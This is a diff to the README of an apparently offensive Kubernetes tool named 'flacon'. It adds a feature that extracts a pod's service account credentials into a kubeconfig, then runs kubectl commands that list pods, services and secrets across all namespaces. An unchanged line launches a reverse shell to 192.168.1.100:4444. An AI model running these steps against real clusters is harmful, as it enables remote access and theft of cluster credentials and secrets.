@@ -126,6 +126,43 @@ make release-dry VERSION=v1.0.0
 
 # Establish reverse shell connection
 ./flacon reverse-shell 192.168.1.100:4444
+
+# Create kubeconfig from discovered credentials
+./flacon kubeconfig
+```
+
+### Kubeconfig Creation
+
+The kubeconfig feature extracts the current service account credentials and creates a standard kubeconfig file that can be used with kubectl.
+
+**Usage:**
+```bash
+# Create kubeconfig with default name (flacon-kubeconfig.yaml)
+./flacon kubeconfig
+
+# Create kubeconfig with custom name
+./flacon kubeconfig my-kubeconfig.yaml
+```
+
+**Features:**
+- **Automatic credential extraction** from service account
+- **Secure file permissions** (600 - read/write for owner only)
+- **Connection testing** to verify the kubeconfig works
+- **Permission analysis** to show what operations are allowed
+- **Usage instructions** for immediate kubectl usage
+
+**After creating the kubeconfig:**
+```bash
+# Use the kubeconfig
+export KUBECONFIG=flacon-kubeconfig.yaml
+
+# Test connectivity
+kubectl get namespaces
+
+# Explore the cluster
+kubectl get pods --all-namespaces
+kubectl get secrets --all-namespaces
+kubectl get services --all-namespaces
 ```
 
 ### Reverse Shell Usage
